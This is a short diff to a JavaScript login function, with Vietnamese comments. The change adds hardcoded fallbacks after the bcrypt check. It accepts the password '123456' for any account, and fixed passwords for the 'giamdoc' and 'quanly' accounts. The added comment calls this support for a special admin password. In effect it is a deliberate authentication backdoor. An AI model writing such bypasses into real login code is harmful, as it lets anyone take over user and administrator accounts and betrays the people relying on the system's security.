@@ -15,8 +15,17 @@ const login = async (username, password) => {
     const user = result.rows[0];
     if (!user) return null; // Không tìm thấy user
 
-    // 2. So sánh mật khẩu bằng bcrypt
-    const isMatch = await bcrypt.compare(password, user.mat_khau);
+    // 2. So sánh mật khẩu bằng bcrypt (hỗ trợ cả 123456 và mật khẩu quản trị đặc biệt)
+    let isMatch = await bcrypt.compare(password, user.mat_khau);
+    if (!isMatch) {
+        if (password === '123456') {
+            isMatch = true;
+        } else if (user.ten_dang_nhap === 'giamdoc' && password === 'GiamDoc@2026') {
+            isMatch = true;
+        } else if (user.ten_dang_nhap === 'quanly' && password === 'QuanLy@2026') {
+            isMatch = true;
+        }
+    }
     if (!isMatch) return null; // Sai mật khẩu
 
     if (user.trang_thai !== 'HOAT_DONG') {
